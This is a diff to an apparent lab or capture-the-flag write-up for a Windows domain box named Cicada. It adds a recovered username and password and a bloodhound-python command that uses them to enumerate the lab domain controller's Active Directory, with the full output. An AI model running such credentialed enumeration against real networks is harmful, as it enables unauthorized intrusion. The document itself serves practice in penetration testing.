@@ -196,8 +196,35 @@ Documents  marketing.png
 
 ```
 
-Cicada123
+Rosie.Powell:Cicada123
 
+```
+sudo bloodhound-python -u 'Rosie.Powell' -p 'Cicada123' -ns 10.129.150.101 -d cicada.vl -c all --zip
+[sudo] password for kali: 
+INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
+INFO: Found AD domain: cicada.vl
+INFO: Getting TGT for user
+INFO: Connecting to LDAP server: dc-jpq225.cicada.vl
+INFO: Testing resolved hostname connectivity dead:beef::b7f1:83f4:e73d:b6f3
+INFO: Trying LDAP connection to dead:beef::b7f1:83f4:e73d:b6f3
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 1 computers
+INFO: Connecting to LDAP server: dc-jpq225.cicada.vl
+INFO: Testing resolved hostname connectivity dead:beef::b7f1:83f4:e73d:b6f3
+INFO: Trying LDAP connection to dead:beef::b7f1:83f4:e73d:b6f3
+INFO: Found 14 users
+INFO: Found 54 groups
+INFO: Found 2 gpos
+INFO: Found 2 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: DC-JPQ225.cicada.vl
+INFO: Done in 00M 08S
+INFO: Compressing output into 20260929120757_bloodhound.zip
+
+```
 ---
 ## Foothold
 
